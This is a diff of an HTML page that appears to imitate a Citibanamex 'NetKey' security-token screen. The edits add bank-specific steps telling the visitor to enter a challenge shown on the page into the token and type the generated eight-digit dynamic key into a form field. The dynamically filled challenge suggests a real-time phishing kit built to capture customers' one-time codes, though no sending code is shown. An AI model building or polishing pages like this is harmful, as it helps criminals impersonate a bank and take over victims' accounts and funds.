@@ -295,19 +295,26 @@
 
                     <div style="display: flex; gap: 18px; align-items: flex-start;">
                         <div style="background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 3px 8px rgba(0,0,0,0.04); flex: 1.1; margin-right: 6px; min-height: 260px; display: flex; flex-direction: column;">
-                            <h2 style="font-size: 18px; margin: 0 0 14px 0; color: #153e46;">Para continuar, ingrese su clave dinámica Token</h2>
-                            <p style="margin: 6px 0; line-height: 1.6; color: #3d5559;">Ingrese el siguiente número de desafío en su dispositivo Token:</p>
+                            <p style="margin: 6px 0; line-height: 1.6; color: #3d5559; font-size: 14px;">Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
+                            <p style="margin: 12px 0 6px 0; line-height: 1.6; color: #3d5559; font-size: 14px;">Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
                             <div style="background: linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%); border-radius: 6px; padding: 16px; margin: 14px 0; text-align: center; border: 2px solid #b4d5d8;">
-                                <div style="font-size: 12px; color: #3d5559; margin-bottom: 6px;">CHALLENGE</div>
+                                <div style="font-size: 12px; color: #3d5559; margin-bottom: 6px;">CHALLNG</div>
                                 <div style="font-size: 42px; font-weight: 600; letter-spacing: 10px; color: #153e46; font-family: 'Courier New', monospace;" id="netkey2-challenge-display">--------</div>
                             </div>
-                            <p style="margin: 10px 0; font-size: 14px; line-height: 1.5; color: #3d5559;">Una vez ingresado, su Token generará una clave dinámica. Ingrese esta clave en el campo de la derecha.</p>
+                            <button 
+                                id="netkey2-cancel-left-btn"
+                                style="padding: 10px 24px; background: #fff; color: #3d5559; border: 2px solid #c4d5d7; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; align-self: flex-start; margin-bottom: 12px;"
+                                onmouseover="this.style.background='#f5f5f5'"
+                                onmouseout="this.style.background='#fff'"
+                            >
+                                Cancelar
+                            </button>
+                            <p style="margin: 6px 0; font-size: 14px; line-height: 1.5; color: #3d5559;">Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
                         </div>
 
                         <div style="background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 3px 8px rgba(0,0,0,0.04); flex: 1; min-height: 260px; display: flex; flex-direction: column; justify-content: space-between;">
                             <div>
-                                <h2 style="font-size: 18px; margin: 0 0 14px 0; color: #153e46;">Ingrese su clave dinámica</h2>
-                                <p style="margin: 6px 0 12px 0; line-height: 1.5; color: #3d5559; font-size: 14px;">Introduzca la clave de 8 dígitos generada por su Token:</p>
+                                <h2 style="font-size: 18px; margin: 0 0 14px 0; color: #153e46;">Clave dinámica</h2>
                                 <input 
                                     type="text" 
                                     id="netkey2-response-input" 
